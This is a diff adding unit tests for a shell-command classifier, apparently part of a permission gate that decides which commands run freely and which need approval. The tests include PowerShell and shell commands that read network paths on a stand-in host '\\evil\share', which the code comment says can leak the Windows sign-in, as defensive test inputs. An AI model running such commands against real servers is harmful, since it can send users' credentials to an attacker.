@@ -190,3 +190,19 @@ describe('a question with a command under it', () => {
     expect(await p).toBe(true);
   });
 });
+
+describe('classify: review fixes', () => {
+  it('a version question is only the flag each program documents', () => {
+    for (const c of ['npx -v', 'npx --version', 'npm version', 'yarn version', 'bun version', 'go version', 'node version'])
+      expect(classify(c, 'win32'), c).toBe('ask');
+    for (const c of ['node -v', 'npm --version', 'python -V', 'java -version']) expect(classify(c, 'win32'), c).toBe('read');
+  });
+
+  it('a network or device path always asks (reading one can send the Windows sign-in to that server)', () => {
+    for (const c of [String.raw`Get-Content \\evil\share\x`, 'ls //evil/share', String.raw`Test-Path \\?\C:\x`,
+      String.raw`type \\.\pipe\x`, String.raw`Get-ChildItem -Path \\evil\s`, String.raw`Select-String -Path \\evil\s\a -Pattern x`])
+      expect(classify(c, 'win32'), c).toBe('ask');
+    expect(classify('ls //evil/share', 'darwin')).toBe('ask');
+    expect(classify(String.raw`Get-Content C:\Users\me\notes.txt`, 'win32')).toBe('read');
+  });
+});
